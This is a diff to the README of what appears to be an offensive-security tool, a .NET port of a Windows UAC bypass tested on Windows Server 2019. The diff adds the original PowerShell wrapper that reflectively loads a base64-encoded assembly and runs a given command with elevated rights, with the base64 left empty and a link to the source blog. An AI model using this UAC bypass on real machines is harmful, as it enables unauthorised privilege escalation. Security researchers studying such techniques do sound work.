@@ -12,7 +12,26 @@ This then led to [Andres Marques](https://twitter.com/_zc00l) wrapping this up i
 
 I wasn't a fan of the PowerShell wrapping and I needed this to work solely in .NET, so I made some changes. Note: I only tested this with an on-disk payload. Additionally, I tested this quite extensively on the Windows 2019 with the UAC Setting as `PromptForNonWindowsBinaries`. 
 
-Finally, it can be quite awkward. I have two _exact_ builds of Windows Server 2019, and it failed on one quite often. However, it worked flawlessly on another. If this is something you will be using, test it thoroughly :)
+Finally, it can be quite awkward. I have two _exact_ builds of Windows Server 2019, and it failed on one quite often. However, the original PowerShell script worked on the other. If anyone knows why this is behaving the way it is, let me know :)
+
+The original payload from [Andres Marques](https://twitter.com/_zc00l):
+
+```csharp
+function UpgradeMe
+{
+    Param(
+        [Parameter(Mandatory = $true, Position = 0)]
+        [string]$Command
+    )
+	$base64=""
+    if(-not ([System.Management.Automation.PSTypeName]'CBP').Type)
+    {
+    	[Reflection.Assembly]::Load([Convert]::FromBase64String($base64)) | Out-Null
+    }
+    [CBP]::Execute($Command)
+}
+```
+Where `$base64` is from the blog: https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
 
 ## Usage
 
